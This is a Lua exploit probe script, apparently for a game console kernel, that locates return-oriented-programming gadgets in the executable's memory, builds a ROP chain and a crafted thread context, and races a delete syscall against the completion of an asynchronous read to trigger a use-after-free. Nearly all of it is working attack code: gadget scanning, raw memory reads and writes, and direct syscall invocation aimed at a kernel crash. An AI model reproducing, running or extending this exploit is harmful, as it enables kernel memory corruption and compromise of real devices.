-- CRASH_CLASS: HIGH
-- PROBE 879a: the state gate is read inside the delete, before the frees.  Hammer 662
-- on a PENDING object from a child while the Lua thread completes the underlying read.
-- If the object's state flips between the gate and the teardown, the delete frees a
-- container the completion path is still using.
print("=== PROBE 879a: delete hammered across a completion ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local pop_rsp=find_pat(ebase,0x494000,string.char(0x5C,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] eboot=%08X", ebase))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rsp and jmp_g) then print("[0] gadget missing") return end
local page=0x4000; local STACK=page*4
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local D=mmap(page); local ids=mmap(page); local st=mmap(page); local out=mmap(page)
local bufp=mmap(page); local res=mmap(page); local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local fds=memory.alloc(8); local a,b=-1,-1
for try=1,5 do
    wd(fds,0xFFFFFFFF); wd(fds+4,0xFFFFFFFF)
    local ok,rv=pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(fds)) end)
    if ok and to_num(rv)==0 then a=rd(fds); b=rd(fds+4); break end
end
print(string.format("[A] socketpair %d/%d", a, b))
if a<0 then return end
wq(D+0x00,uint64(0)); wq(D+0x08,uint64(0x1000)); wq(D+0x10,uint64(bufp)); wq(D+0x18,uint64(res)); wd(D+0x20,a); wd(D+0x24,0)
local okc,rvc=pcall(function() return mk(669)(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(out)) end)
local id=rd(out) or 0
wd(ids,id); pcall(function() mk(664)(uint64(ids),uint64(1),uint64(st)) end)
print(string.format("[B] create=%s rv=%s id=%08X state=%08X", tostring(okc), tostring(rvc), id, rd(st) or 0))
if id==0 then return end
-- child loops 662(ids,1,st) forever, rewinding its own stack
local block=mmap(STACK); local start=block+STACK-0x200
local ch={pop_rdi,ids,pop_rsi,1,pop_rdx,st,pop_rax,662,fn,pop_rsp,start}
for i=1,#ch do wq(start+(i-1)*8,uint64(ch[i])) end
local ctx=memory.alloc(0x500); zero(ctx,0x500)
wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start))
wq(ctx+Ctx.RDI,uint64(ids)); wq(ctx+Ctx.RSI,uint64(1)); wq(ctx+Ctx.RDX,uint64(st)); wq(ctx+Ctx.RAX,uint64(662))
local tb=memory.alloc(8); wq(tb,uint64(0))
local oks,rvs=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
print(string.format("[C] hammer spawn ok=%s rv=%s", tostring(oks), tostring(rvs)))
if not (oks and to_num(rvs)==0) then return end
sleep_ms(5)
print(string.format("[D] before completion: status=%08X state=%08X", rd(st) or 0, rd(st) or 0))
pcall(function() mk(4)(uint64(b),uint64(bufp),uint64(1),uint64(0),uint64(0)) end)
for k=1,6 do
    sleep_ms(4)
    print(string.format("[E] +%2dms status=%08X", k*4, rd(st) or 0))
end
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
